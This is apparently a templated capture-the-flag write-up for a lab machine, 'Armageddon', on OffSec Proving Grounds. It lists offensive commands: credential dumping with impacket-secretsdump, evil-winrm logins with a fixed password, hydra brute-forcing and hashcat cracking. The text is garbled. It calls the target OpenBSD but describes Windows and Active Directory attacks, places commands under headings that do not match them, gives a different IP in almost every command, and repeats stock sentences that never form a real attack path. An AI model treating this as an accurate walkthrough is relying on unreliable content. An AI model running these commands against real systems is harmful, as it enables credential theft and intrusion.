---
TitleSEO: "OffSec Proving Grounds — Armageddon (Hard OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Armageddon (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Armageddon. SeImpersonatePrivilege and Remote File Inclusion to achieve hard compromise on OpenBSD."
Keywords: "linux, medium, windows, tryhackme, hard, forensics, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-armageddon-322.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-armageddon-322/"
Date: "2025-10-10"
Tags: "Linux, Medium, Windows, TryHackMe, Hard, Forensics, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-armageddon-322"
Permalink: "/writeups/htb-armageddon-322.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Armageddon** is rated **Hard** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.44.240.94`.

### Objectives

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.117.79.54 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.15.234.155
feroxbuster -h
```

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

```bash
crackmapexec smb 10.67.249.51 -u administrator -p 'P@ssw0rd!' --shares
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.42.33.198 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.117.113.86/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Exploitation

### Vulnerability Identification

The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

Key finding: **XSS**.

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Initial Access

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory.

```bash
nmap -sCV -p27017,995,1433 10.12.77.38 -oN scan.txt
nmap -sCV -p110,1433,636 10.55.226.92 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.81.37.36/FUZZ
```

Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

```powershell
gobuster dir -u http://10.31.175.26/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.104.90.17 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
nmap -sCV -p8443,464,9200 10.100.145.222 -oN scan.txt
crackmapexec smb 10.24.128.69 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.117.182.78 -u administrator -p 'P@ssw0rd!'
```

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

## Summary

### Tools Used

- `sqlmap`
- `evil-winrm`
- `ffuf`
- `impacket`
- `nmap`

### Key Takeaways

- SeImpersonatePrivilege
- Remote File Inclusion
- XSS
- Kerberoasting
